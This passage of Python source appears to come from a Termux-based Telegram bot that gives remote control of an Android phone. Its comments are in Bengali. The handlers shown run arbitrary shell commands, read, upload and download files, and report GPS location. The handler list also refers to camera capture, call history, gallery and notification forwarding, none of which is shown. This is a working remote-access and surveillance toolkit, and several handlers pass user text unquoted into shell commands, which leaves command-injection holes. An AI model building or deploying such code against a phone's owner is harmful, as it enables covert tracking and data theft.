async def cat(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    if not ctx.args:
        await update.message.reply_text("❌ /cat <file>"); return
    r = shell(f"cat {' '.join(ctx.args)}")
    await update.message.reply_text(f"📄 {' '.join(ctx.args)}:\n{r[:4000]}")

async def write(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    if len(ctx.args) < 2:
        await update.message.reply_text("❌ /write <file> <text>"); return
    fname = ctx.args[0]
    text  = " ".join(ctx.args[1:])
    shell(f"echo '{text}' > {fname}")
    await update.message.reply_text(f"✅ Written to {fname}")

async def find_file(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    if not ctx.args:
        await update.message.reply_text("❌ /find <name>"); return
    r = shell(f"find {session['cwd']} -name '*{ctx.args[0]}*' 2>/dev/null | head -30")
    await update.message.reply_text(f"🔍 Results:\n{r[:4000]}")

async def fileinfo(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    if not ctx.args:
        await update.message.reply_text("❌ /fileinfo <path>"); return
    r = shell(f"stat {' '.join(ctx.args)}")
    await update.message.reply_text(f"📋 File Info:\n{r[:4000]}")

async def get(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    if not ctx.args:
        await update.message.reply_text("❌ /get <path>"); return
    path = " ".join(ctx.args)
    if not os.path.exists(path):
        await update.message.reply_text(f"❌ File নেই: {path}"); return
    try:
        await update.message.reply_document(open(path, "rb"))
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

async def tree(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    path = " ".join(ctx.args) if ctx.args else session["cwd"]
    r    = shell(f"find {path} -maxdepth 3 2>/dev/null | head -50")
    await update.message.reply_text(f"🌳 Tree:\n{r[:4000]}")

async def upload(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    if not update.message.document:
        await update.message.reply_text("❌ File reply করুন /upload দিয়ে"); return
    file = await update.message.document.get_file()
    path = os.path.join(session["cwd"], update.message.document.file_name)
    await file.download_to_drive(path)
    await update.message.reply_text(f"✅ Uploaded: {path}")

# ─────────────────────────────────────────
# /notify
# ─────────────────────────────────────────
async def notify(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    msg = " ".join(ctx.args) if ctx.args else "Test Notification"
    shell(f"termux-notification --title 'RemoteBot' --content '{msg}'")
    await update.message.reply_text(f"🔔 Notification পাঠানো হয়েছে:\n{msg}")

# ─────────────────────────────────────────
# /location
# ─────────────────────────────────────────
async def location(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    await update.message.reply_text("📍 Location নিচ্ছি...")

    # ✅ বাগ ১ ফিক্স: GPS provider দিয়ে একবার live reading নাও
    result = shell("termux-location -p gps -r once", timeout=60)

    # ✅ বাগ ১ ফিক্স: GPS fail হলে network provider দিয়ে fallback চেষ্টা
    if not result or "latitude" not in result:
        result = shell("termux-location -p network -r once", timeout=30)

    try:
        d   = json.loads(result)
        lat = d.get("latitude")
        lon = d.get("longitude")

        # ✅ বাগ ২ ফিক্স: None হলে Telegram crash করবে, আগে validate করো
        if lat is None or lon is None:
            await update.message.reply_text(
                "❌ Location পাওয়া যায়নি!\n"
                "GPS চালু আছে কিনা চেক করুন।"
            )
            return

        await update.message.reply_location(latitude=lat, longitude=lon)
        await update.message.reply_text(
            f"📍 Location:\nLat: {lat}\nLon: {lon}\n"
            f"Accuracy: {d.get('accuracy', 'N/A')} m\n"
            f"Provider: {d.get('provider', 'N/A')}"
        )

    except json.JSONDecodeError:
        # ✅ বাগ ৩ ফিক্স: JSON parse fail মানে GPS/permission সমস্যা
        await update.message.reply_text(
            f"❌ Location parse করা যায়নি!\n"
            f"GPS/Permission চেক করুন।\n"
            f"Raw: {result[:200] if result else 'কোনো output নেই'}"
        )
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

# ─────────────────────────────────────────
# /shell / /sh
# ─────────────────────────────────────────
async def shell_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    if not ctx.args:
        await update.message.reply_text("❌ /shell <command>"); return
    cmd = " ".join(ctx.args)
    r   = shell(cmd)
    await update.message.reply_text(f"$ {cmd}\n\n{r[:4000]}")

# ─────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────
def main():
    app = Application.builder().token(BOT_TOKEN).build()

    handlers = [
        ("start",          start),
        ("reset",          reset_config),
        ("battery",        battery),
        ("info",           info),
        ("storage",        storage),
        ("wifi",           wifi),
        ("ip",             ip),
        ("cam_front",      cam_front),
        ("cam_back",       cam_back),
        ("calls",          call_history),
        ("gallery",        gallery),
        ("stop_gallery",   stop_gallery),
        ("notifications",  notifications),
        ("notif",          start_notif_forward),
        ("stop_notif",     stop_notif),
        ("vibrate",        vibrate),
        ("torch_on",       torch_on),
        ("torch_off",      torch_off),
        ("notify",         notify),
        ("location",       location),
    ]

    for name, func in handlers:
        app.add_handler(CommandHandler(name, func))

    print(f"✅ Bot চলছে! Token: {BOT_TOKEN[:10]}...")
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
